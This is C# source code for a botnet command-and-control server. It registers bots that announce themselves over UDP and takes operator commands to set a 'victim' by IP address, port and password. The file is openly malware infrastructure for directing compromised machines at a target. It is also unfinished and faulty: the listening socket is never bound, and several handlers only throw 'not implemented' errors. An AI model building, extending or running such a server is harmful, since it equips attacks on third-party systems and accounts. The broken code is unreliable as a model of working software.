using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace CC
{
    class CCServer
    {
        static readonly int MAX_SIZE = 256;
        private UdpClient _udpclient;
        private int _listen_port;
        private string _ip;
        private IPEndPoint _server_end_point;
        private bool _done;
        private readonly string _newline_delimeter = "\r\n";
        private List<Bot> _bots;
        private Victim _victim;
        enum CmdType { SET_VICTIM, UNKNOWN };

        public CCServer(int listen_port, string ip)
        {
            _listen_port = listen_port;
            _ip = ip;
            _udpclient = new UdpClient(_listen_port);
            _server_end_point = new IPEndPoint(IPAddress.Parse(_ip), _listen_port);
            _bots = new List<Bot>();
        }
        public void serve()
        {
            Thread t1 = new Thread(listen);
            t1.Start();
        }
        public void control()
        {
            Console.WriteLine("Ready");
            bool done = false;
            string cmd;
            while (!done) {
                cmd = Console.ReadLine();
                handle_cmd(cmd);
            }
        }

        private void handle_cmd(string cmd)
        {
            CmdType cmd_type = get_cmd_type(cmd);
            switch (cmd_type) {
                case CmdType.SET_VICTIM:
                    set_victim(cmd);
                    break;
                case CmdType.UNKNOWN:
                    unknown_cmd(cmd);
                    break;
            }
        }

        private void set_victim(string cmd)
        {
            Regex ip_rx = new Regex(@"(?<=IP:\s*)\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
                RegexOptions.Compiled | RegexOptions.None);
            Regex port_rx = new Regex(@"(?<=port:\s*)\d*\b",
                RegexOptions.Compiled | RegexOptions.None);
            Regex pass_rx = new Regex(@"(?<=password:\s*)\w+",
                RegexOptions.Compiled | RegexOptions.None);
            MatchCollection ip_matches = ip_rx.Matches(cmd);
            MatchCollection port_matches = port_rx.Matches(cmd);
            MatchCollection pass_matches = pass_rx.Matches(cmd);
            if (ip_matches.Count ==0 || port_matches.Count == 0 || pass_matches.Count == 0)
            {
                Console.WriteLine("BAD SET VICTIM COMMAND: {0}", cmd);
            }
            else {
                _victim = new Victim(
                    ip_matches[0].Groups[0].Value,
                    port_matches[0].Groups[0].Value,
                    pass_matches[0].Groups[0].Value
                    );
                Console.WriteLine("Created Victim:\n{0}", _victim.ToString());
            }
        }
        private void unknown_cmd(string cmd)
        {
            Console.WriteLine("Unknown cmd: {0}", cmd);
        }

        private void listen()
        {
            Socket listen_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            while (!_done) {
                byte[] rcv_buffer = new byte[MAX_SIZE];
                IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
                EndPoint Remote = (EndPoint)(sender);
                int read_bytes = listen_socket.ReceiveFrom(rcv_buffer, ref Remote);
                int message_end_offset = get_messgae_end(rcv_buffer, read_bytes);
                if (message_end_offset == -1)
                {
                    handleNoResponse();
                }
                string data =  Encoding.UTF8.GetString(rcv_buffer, 0, message_end_offset);
                handle_bot_announcment(data, Remote);
            }
        }

        private void handle_bot_announcment(string data, EndPoint remote)
        {
            if (valid_bot_annoucemnt(data))
            {
                int port;
                Int32.TryParse(data, out port);
                _bots.Add(new Bot(remote, port));
            }
            else {
                handle_invalid_bot_announcment(data, remote);
            }
        }

        private CmdType get_cmd_type(string cmd)
        {
            if (cmd.StartsWith("Set victim") || cmd.StartsWith("Set Victim"))
            {
                return CmdType.SET_VICTIM;
            }
            else {
                return CmdType.UNKNOWN;
            }
        }

        private bool valid_bot_annoucemnt(string data)
        {
            if (data ==null) {
                return false;
            }
            int tmp;
            return data.Length ==2 && int.TryParse(data, out tmp);
        }

        private void handle_invalid_bot_announcment(string data, EndPoint remote)
        {
            throw new NotImplementedException();
        }

        private string receive(Socket listen_socket)
        {
            byte[] rcv_buffer = new byte[MAX_SIZE];
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
            EndPoint Remote = (EndPoint)(sender);
            int read_bytes = listen_socket.ReceiveFrom(rcv_buffer, ref Remote);
            int message_end_offset = get_messgae_end(rcv_buffer, read_bytes);
            if (message_end_offset == -1)
            {
                //handleNoResponse(client);
                return null;
            }
            return Encoding.UTF8.GetString(rcv_buffer, 0, message_end_offset);
        }
        private void handleNoResponse()
        {
            throw new NotImplementedException();
        }
        private int get_messgae_end(byte[] rcv_buffer, int readBytes)
        {
            int offset = 0;
            while (offset < readBytes - 1 && offset < rcv_buffer.Length - 1)
            {
                byte[] maybe_delimeter_bytes = { rcv_buffer[offset], rcv_buffer[offset + 1] };
                string maybe_delimeter = Encoding.ASCII.GetString(maybe_delimeter_bytes);
                if (maybe_delimeter.Equals(_newline_delimeter))
                {
                    return offset;
                }
                offset++;
            }
            return -1;
        }
    }
}
